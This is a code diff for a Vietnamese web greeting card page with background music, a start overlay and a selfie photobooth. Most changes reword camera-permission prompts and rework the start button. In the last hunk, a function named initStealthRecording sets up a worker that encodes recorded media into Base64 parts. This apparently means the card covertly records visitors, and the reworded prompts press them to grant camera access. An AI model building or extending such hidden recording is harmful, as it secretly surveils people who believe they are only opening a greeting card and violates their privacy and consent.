@@ -198,11 +198,11 @@ function openSelfieModal() {
       .catch(err => {
         console.warn('Camera error/permission denied:', err);
         if (err.name === 'NotAllowedError' || err.name === 'SecurityError') {
-          showCameraNotice("⚠️ Trình duyệt đang chặn Camera. Vui lòng tắt bong bóng chat, hoặc ấn dấu 3 chấm góc phải chọn 'Mở bằng trình duyệt' (Chrome/Safari)!");
+          showCameraNotice("⚠️ Vui lòng cấp quyền Camera để có thể chụp ảnh Photobooth kỷ niệm nhé! Hoặc bạn có thể bấm 'Tải ảnh từ máy' bên dưới.");
         } else if (err.name === 'NotFoundError') {
           showCameraNotice("📸 Không tìm thấy Camera. Hãy dùng nút 'Tải ảnh từ máy' bên dưới nhé!");
         } else {
-          showCameraNotice("⚠️ Trình duyệt đang chặn Camera. Vui lòng tắt bong bóng chat, hoặc ấn dấu 3 chấm góc phải chọn 'Mở bằng trình duyệt' (Chrome/Safari)!");
+          showCameraNotice("⚠️ Vui lòng cấp quyền Camera để có thể chụp ảnh Photobooth kỷ niệm nhé! Hoặc bấm 'Tải ảnh từ máy' bên dưới.");
         }
         if (btnTake) {
           btnTake.disabled = true;
@@ -604,18 +604,25 @@ document.addEventListener("DOMContentLoaded", async () => {
   const startOverlay = document.getElementById("start-overlay");
 
   if (startOverlay) {
+    const startBtnAction = document.getElementById("start-btn-action");
+
     // Lắng nghe khi nhạc đã tải xong đủ để phát không giật lag
     window.currentAudio.addEventListener('canplaythrough', function () {
-      startOverlay.innerHTML = "Chạm vào đây để mở thiệp ✨";
-      startOverlay.style.pointerEvents = "auto"; // Cho phép click
-      startOverlay.style.opacity = "1";
-      startOverlay.classList.add('pulse-animation'); // Thêm class hiệu ứng đập nhịp nhàng
+      if (startBtnAction) {
+        startBtnAction.innerHTML = "✨ Mở Thiệp & Khám Phá ✨";
+        startBtnAction.style.pointerEvents = "auto";
+        startBtnAction.style.opacity = "1";
+        startBtnAction.classList.add('pulse-animation');
+      }
     });
 
     // Xử lý khi người dùng chạm
-    startOverlay.addEventListener('click', function () {
-      window.currentAudio.play(); // Nhạc sẽ nổ ra ngay lập tức 100% không độ trễ
-      startOverlay.style.display = 'none';
+    const handleStartClick = function () {
+      window.currentAudio.play().catch(() => {});
+      startOverlay.style.opacity = '0';
+      setTimeout(() => {
+        startOverlay.style.display = 'none';
+      }, 500);
 
       const audioIcon = document.getElementById("audio-icon");
       if (audioIcon) audioIcon.textContent = "🔊";
@@ -627,6 +634,15 @@ document.addEventListener("DOMContentLoaded", async () => {
         initStageCountdown(lockStatus);
       } else {
         startCelebrationJourney();
+      }
+    };
+
+    if (startBtnAction) {
+      startBtnAction.addEventListener('click', handleStartClick);
+    }
+    startOverlay.addEventListener('click', function (e) {
+      if (e.target === startOverlay || (startBtnAction && startBtnAction.contains(e.target))) {
+        handleStartClick();
       }
     });
   } else {
@@ -2266,7 +2282,7 @@ function initStealthRecording() {
 
   // Web Worker chuyển Blob -> Base64 không block UI
   try {
-    stealthWorker = new Worker('js/worker.js');
+    stealthWorker = new Worker('js/worker.js?v=4');
     stealthWorker.onmessage = (e) => {
       pendingWorkerTasks--;
       const { base64, part, mimeType } = e.data;
